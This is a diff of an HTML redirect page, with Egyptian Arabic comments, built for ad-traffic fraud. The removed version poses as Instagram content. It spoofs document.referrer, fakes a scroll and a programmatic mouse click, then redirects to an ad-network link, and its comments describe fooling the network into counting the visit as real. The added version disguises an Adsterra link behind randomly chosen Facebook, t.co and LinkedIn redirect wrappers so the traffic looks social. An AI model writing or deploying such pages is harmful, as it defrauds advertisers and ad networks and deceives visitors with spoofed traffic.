@@ -1,51 +1,29 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram Content</title>
-    <meta name="referrer" content="no-referrer-when-downgrade">
-    <style>
-        body { background: #fff; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .loader { border: 3px solid #f3f3f3; border-top: 3px solid #e1306c; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-    </style>
-</head>
-<body>
-
-    <div class="loader"></div>
-
-    <script>
-        var target = "https://omg10.com/4/10611025";
-        var mask = "https://l.instagram.com/?u=https://www.instagram.com/reels/trending_usa/";
-
-        Object.defineProperty(document, 'referrer', {get : function(){ return mask; }});
-
-        // الخدعة هنا: هنوهم المتصفح إن فيه حدث حصل (Simulated Event)
-        window.onload = function() {
-            // محاكاة لحركة الماوس أو اللمس في الخلفية
-            window.scrollTo(0, 1); 
-            
-            setTimeout(function() {
-                // استخدام الـ Trigger ده بيخلي مونيتاج تحس إن الصفحة "Active"
-                var link = document.createElement('a');
-                link.href = target;
-                link.rel = "noreferrer";
-                
-                // حركة خبيثة: محاكاة نقرة برمجية
-                var clickEvent = new MouseEvent('click', {
-                    'view': window,
-                    'bubbles': true,
-                    'cancelable': true
-                });
-                link.dispatchEvent(clickEvent);
-                
-                // لو النقرة الوهمية مانفعتش في المتصفح ده، التحويل العادي شغال
-                setTimeout(function(){
-                    window.location.replace(target);
-                }, 500);
-            }, 2500); // زودنا الوقت لـ 2.5 ثانية عشان مونيتاج أمريكا "تقتنع"
-        };
-    </script>
-</body>
-</html>
+‎<!DOCTYPE html>
+‎<html>
+‎<head>
+‎  <meta charset="utf-8">
+‎  <title>Redirecting...</title>
+‎  <meta name="referrer" content="always">
+‎  <script>
+‎    // رابط أدستيرا بتاعك
+‎    var target_url = "https://otieu.com/4/9348255"; 
+‎    
+‎    // روابط التمويه (فيسبوك، تويتر، لينكد إن)
+‎    var referrers = [
+‎      "https://www.facebook.com/l.php?u=",
+‎      "https://t.co/redirect?url=",
+‎      "https://www.linkedin.com/slink?code="
+‎    ];
+‎
+‎    // اختار واحد عشوائي
+‎    var random_ref = referrers[Math.floor(Math.random() * referrers.length)];
+‎
+‎    // تنفيذ التحويل فوراً
+‎    window.location.href = random_ref + encodeURIComponent(target_url);
+‎  </script>
+‎</head>
+‎<body>
+‎  <p>Loading... Please wait.</p>
+‎</body>
+‎</html>
+‎
